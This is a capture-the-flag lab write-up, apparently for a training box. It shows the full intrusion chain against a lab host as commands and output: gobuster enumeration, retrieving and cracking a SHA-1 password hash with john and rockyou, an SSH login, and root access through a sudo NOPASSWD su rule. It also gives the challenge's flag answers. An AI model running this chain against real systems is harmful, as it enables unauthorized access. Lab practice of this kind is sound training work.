
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.246.33/secret/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt
[+] Timeout:        10s
===============================================================
2020/09/23 21:38:28 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.txt (Status: 403)
/index.html (Status: 200)
/secret.txt (Status: 200)
===============================================================
2020/09/23 21:39:00 Finished
===============================================================
```

- Found: Directory: http://10.10.246.33/secret/
- Found: File: http://10.10.246.33/secret/secret.txt

```
wget -O http://10.10.246.33/secret/secret.txt

nyan:046385855FC9580393853D8E81F240B66FE9A7B8
```

- Found: Hash: nyan:046385855FC9580393853D8E81F240B66FE9A7B8

```
hashid 046385855FC9580393853D8E81F240B66FE9A7B8

Analyzing '046385855FC9580393853D8E81F240B66FE9A7B8'
[+] SHA-1
[+] Double SHA-1
[+] RIPEMD-160
[+] Haval-160
[+] Tiger-160
[+] HAS-160
[+] LinkedIn
[+] Skein-256(160)
[+] Skein-512(160)
```

```
john nyan.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
nyan             (?)
1g 0:00:00:01 DONE (2020-09-23 21:44) 0.6024g/s 2994Kp/s 2994Kc/s 2994KC/s nyan042077..nyamwaro
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
```

- Crack: Hash: 046385855FC9580393853D8E81F240B66FE9A7B8:nyan

```
ssh nyan@10.10.246.33

The authenticity of host '10.10.246.33 (10.10.246.33)' can't be established.
ECDSA key fingerprint is SHA256:haqegvkQqmIEEzS0Mcd+NUsONboBQ6z3wQSwq+aj5Es.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.246.33' (ECDSA) to the list of known hosts.
nyan@10.10.246.33's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Dec 21 08:37:54 2019
nyan@ubuntu:~$
```

- Access: SSH: nyan@10.10.246.33 - Password: nyan

```
nyan@ubuntu:~$ ls -l
total 4
-rw-rw-r-- 1 nyan nyan 14 Dec 20  2019 user.txt

nyan@ubuntu:~$ cat user.txt
supernootnoot
```

- User Flag: `supernootnoot`

```
nyan@ubuntu:~$ sudo -l
Matching Defaults entries for nyan on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nyan may run the following commands on ubuntu:
    (root) NOPASSWD: /bin/su

nyan@ubuntu:~$ sudo su
root@ubuntu:/home/nyan# cat ~/
.bash_history  .bashrc        .nano/         .profile       root.txt

root@ubuntu:/home/nyan# cat ~/root.txt
congratulations!!!!
```

- Root Flag `congratulations!!!!`

1. What is the user.txt

`supernootnoot`

2. What is the root.txt

`congratulations!!!!`
